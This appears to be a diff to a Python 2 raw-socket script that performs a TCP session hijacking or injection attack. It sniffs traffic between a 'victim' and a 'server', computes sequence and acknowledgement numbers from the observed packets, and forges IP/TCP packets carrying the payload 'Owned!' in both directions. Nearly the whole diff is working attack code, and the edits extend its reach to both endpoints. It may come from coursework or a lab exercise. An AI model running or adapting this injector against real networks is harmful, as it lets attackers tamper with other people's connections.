@@ -27,32 +27,57 @@ while True:
     # the ! stands for network order
     eth_header = struct.unpack("!6s6s2s", ethernet_header)
     ipheader = packet[0][14:34]
-    ip_header = struct.unpack("!12s4s4s", ipheader)
+    ip_header = struct.unpack("!BBHHHBBH4s4s", ipheader)
     tcp_header = packet[0][34:54]
     tcp_info = struct.unpack("!HHLL8s", tcp_header)
 
-    sourceIP = socket.inet_ntoa(ip_header[1])
-    destIP = socket.inet_ntoa(ip_header[2])
+    sourceIP = socket.inet_ntoa(ip_header[8])
+    destIP = socket.inet_ntoa(ip_header[9])
     sourcePort = tcp_info[0]
     destPort = tcp_info[1]
     seqNo = tcp_info[2]
     ackNo = tcp_info[3]
+    totalLen = ip_header[2]-40
+    
 
-    if(destIP == victimIP or destIP == serverIP):
-        print "Destination MAC:" + binascii.hexlify(eth_header[0]) + " Source MAC:" + binascii.hexlify(
-            eth_header[1]) + " Type:" + binascii.hexlify(eth_header[2])
-        print "Source IP:" + sourceIP + " Destination IP:" + destIP
-        print "Source Port:" + str(sourcePort) + \
-            " Destination Port: "+str(destPort)
-        print "seqNo: " + str(seqNo) + " ackNo: "+str(ackNo)
-        break
+    if(sourceIP == victimIP):
+        # print "Destination MAC:" + binascii.hexlify(eth_header[0]) + " Source MAC:" + binascii.hexlify(
+        #     eth_header[1]) + " Type:" + binascii.hexlify(eth_header[2])
+        # print "Source IP:" + sourceIP + " Destination IP:" + destIP
+        # print "Source Port:" + str(sourcePort) + \
+        #     " Destination Port: "+str(destPort)
+        # print "seqNo: " + str(seqNo) + " ackNo: "+str(ackNo)
+        print "received from victim"
         data = "Owned!"
         ip = IPPacket(destIP, sourceIP)
         ip.assemble_ipv4_feilds()
-        tcp = TCPPacket(destPort, sourcePort, destIP,
-                        sourceIP, seqNo, ackNo, data)
+        tcp = TCPPacket(destPort, sourcePort, destIP, sourceIP, seqNo, ackNo, 0,data)
         tcp.assemble_tcp_feilds()
+        sock2.sendto(ip.raw+tcp.raw+struct.pack("!6s",data), (destIP, destPort))
+        print "packet sent to server\n\n"
 
-        sock2.sendto(ip.raw+tcp.raw+struct.pack("!6s", data),
-                     (destIP, destPort))
-        print "packet sent\n\n"
+        ip = IPPacket(sourceIP, destIP)
+        ip.assemble_ipv4_feilds()
+        tcp = TCPPacket(sourcePort, destPort, sourceIP, destIP, ackNo, seqNo+totalLen, 1,data)
+        tcp.assemble_tcp_feilds()
+        sock2.sendto(ip.raw+tcp.raw+struct.pack("!6s",data), (sourceIP, sourcePort))
+        print "packet sent to victim\n\n"
+    elif(sourceIP==serverIP):
+        print "received from server"
+        data = "Owned!"
+        ip = IPPacket(sourceIP, destIP)
+        ip.assemble_ipv4_feilds()
+        tcp = TCPPacket(sourcePort, destPort, sourceIP, destIP, ackNo, seqNo+totalLen, 0,data)
+        tcp.assemble_tcp_feilds()
+        sock2.sendto(ip.raw+tcp.raw+struct.pack("!6s",data), (sourceIP, sourcePort))
+        print "packet sent to server\n\n"
+
+        ip = IPPacket(destIP, sourceIP)
+        ip.assemble_ipv4_feilds()
+        tcp = TCPPacket(destPort, sourcePort, destIP, sourceIP, seqNo, ackNo, 1,data)
+        tcp.assemble_tcp_feilds()
+        sock2.sendto(ip.raw+tcp.raw+struct.pack("!6s",data), (destIP, destPort))
+        print "packet sent to victim\n\n"
+
+
+
